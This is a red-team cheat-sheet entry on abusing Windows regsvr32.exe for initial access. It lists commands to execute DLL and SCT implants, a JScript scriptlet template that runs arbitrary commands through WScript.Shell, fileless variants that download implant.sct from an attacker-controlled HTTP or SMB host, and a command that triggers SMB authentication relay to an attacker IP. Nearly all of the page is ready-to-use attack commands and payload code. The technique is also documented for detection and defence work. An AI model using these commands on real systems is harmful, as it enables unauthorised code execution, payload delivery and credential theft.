---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - living-off-the-land
  - T1117
  - windows
---
# Regsvr32

Execute DLL implant.

```
C:\> regsvr32.exe /s implant.dll
```

Execute a SCT implant.

```xml
<?XML version="1.0"?>
<scriptlet>
<registration 
    progid="PoC"
    classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
    <script language="JScript">
        <![CDATA[
            var r = new ActiveXObject("WScript.Shell").Run("<commands>");    
        ]]>
</script>
</registration>
</scriptlet>
```

```
C:\> regsvr32.exe /s /u /i:implant.sct scrobj.dll
```

Execute a fileless implant.

```
C:\> regsvr32.exe /s /u /i:http[s]://<IP>[:PORT]/implant.sct scrobj.dll

C:\> regsvr32.exe /s /u /i:\\<attacker_IP>\implant.sct scrobj.dll
```

Execute command to perform SMB authentication relay.

```
C:\> regsvr32.exe /s /u /i:\\<attacker_IP>\@snare scrobj.dll
```

---
## References

### LOLBAS

- [LOLBAS: Regsvr32](https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/)

### Hacktricks

- [Hacktricks: Windows Reverse Shells](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/reverse-shells/windows.html)

### Red Team Notes

- [Red Team Notes: Code Execution - Regsvr32](https://www.ired.team/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo)